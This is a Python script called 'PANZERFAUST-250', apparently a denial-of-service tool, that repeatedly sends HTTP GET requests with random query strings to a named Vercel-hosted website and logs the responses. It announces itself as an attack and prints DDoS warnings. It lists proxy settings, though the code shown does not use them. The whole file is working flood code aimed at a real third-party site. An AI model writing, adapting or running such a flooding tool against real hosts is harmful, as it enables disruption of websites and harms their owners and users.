import asyncio
import aiohttp
import sys
import signal
import random
import time

# ================= CONFIG =================
TARGET = "https://sts-network.vercel.app/"
PROXY_FILE = "proxies.txt"
DIRECT_CONNECTIONS = 3      # REDUCED - Vercel blocks quickly
PROXY_CONNECTIONS = 5       # REDUCED - proxies will fail fast
# ==========================================

running = True
real_requests_sent = 0
real_responses_received = 0
real_status_codes = []
last_real_status = 0

# ================= LOGGING =================
def log_status():
    global last_real_status
    formatted_sent = f"{real_requests_sent:,}"
    formatted_responses = f"{real_responses_received:,}"
    
    # Color based on last real status
    if last_real_status == 0:
        status_color = '\033[91m'
        status_text = "BLOCKED"
    elif 200 <= last_real_status < 300:
        status_color = '\033[92m'
        status_text = str(last_real_status)
    elif last_real_status == 403:
        status_color = '\033[93m'
        status_text = "403"
    else:
        status_color = '\033[91m'
        status_text = str(last_real_status)
    
    print(f"\033[96mPANZERFAUST-250\033[0m:\033[92m{formatted_sent}\033[0m/\033[93m{formatted_responses}\033[0m ----> {status_color}{status_text}\033[0m")

# ================= REAL ATTACK =================
async def real_attack():
    global real_requests_sent, real_responses_received, last_real_status, running
    
    print(f"[!] ATTACKING: {TARGET}")
    print(f"[!] Vercel blocks at edge - expect 403/BLOCKED")
    
    connector = aiohttp.TCPConnector(limit=0, force_close=True)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        while running:
            try:
                # TRY 1: Direct attack
                real_requests_sent += 1
                async with session.get(
                    TARGET + f"?attack={random.randint(1,99999)}",
                    timeout=aiohttp.ClientTimeout(total=3)
                ) as response:
                    # ONLY COUNT IF WE GET A REAL RESPONSE
                    real_responses_received += 1
                    last_real_status = response.status
                    real_status_codes.append(response.status)
                    await response.read()
                    
                    # Show what's really happening
                    if response.status == 403:
                        print(f"[!] Vercel BLOCKED: 403 Forbidden")
                    elif response.status == 429:
                        print(f"[!] Vercel RATE LIMITED: 429 Too Many Requests")
                    elif response.status == 200:
                        print(f"[!] REACHED ORIGIN: 200 OK (unlikely)")
                
            except aiohttp.ClientConnectorError:
                last_real_status = 0
                print(f"[!] Connection refused (IP blocked)")
            except aiohttp.ClientResponseError as e:
                real_responses_received += 1
                last_real_status = e.status
                print(f"[!] HTTP Error: {e.status}")
            except asyncio.TimeoutError:
                last_real_status = 0
                print(f"[!] Timeout (Vercel dropping packets)")
            except Exception as e:
                last_real_status = 0
                print(f"[!] Error: {type(e).__name__}")
            
            # Small delay to not get instantly IP banned
            await asyncio.sleep(0.1)

# ================= MAIN =================
async def main():
    global running
    
    print(f"\033[91m[!] PANZERFAUST-250 VERCELL TRUTH TEST\033[0m")
    print(f"\033[93m[TARGET] {TARGET}\033[0m")
    print(f"\033[91m[WARNING] Vercel blocks all DDoS at edge\033[0m")
    print(f"\033[91m[WARNING] You will see 403/429/BLOCKED\033[0m")
    print("-" * 50)
    
    # Start attack
    attack_task = asyncio.create_task(real_attack())
    
    # Start logging every 10 seconds
    while running:
        log_status()
        
        # Show recent status codes
        if real_status_codes:
            recent = real_status_codes[-10:] if len(real_status_codes) > 10 else real_status_codes
            print(f"Recent statuses: {recent}")
        
        try:
            await asyncio.sleep(10)
        except asyncio.CancelledError:
            break
    
    await attack_task

def signal_handler(sig, frame):
    global running
    print(f"\n\033[91m[!] Stopping...\033[0m")
    running = False

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\033[91m[!] Stopped by user\033[0m")
    finally:
        print(f"\n\033[95m[RESULTS]\033[0m")
        print(f"Requests attempted: {real_requests_sent:,}")
        print(f"Responses received: {real_responses_received:,}")
        print(f"Success rate: {(real_responses_received/real_requests_sent*100 if real_requests_sent > 0 else 0):.1f}%")
        if real_status_codes:
            from collections import Counter
            print(f"Status codes: {Counter(real_status_codes)}")
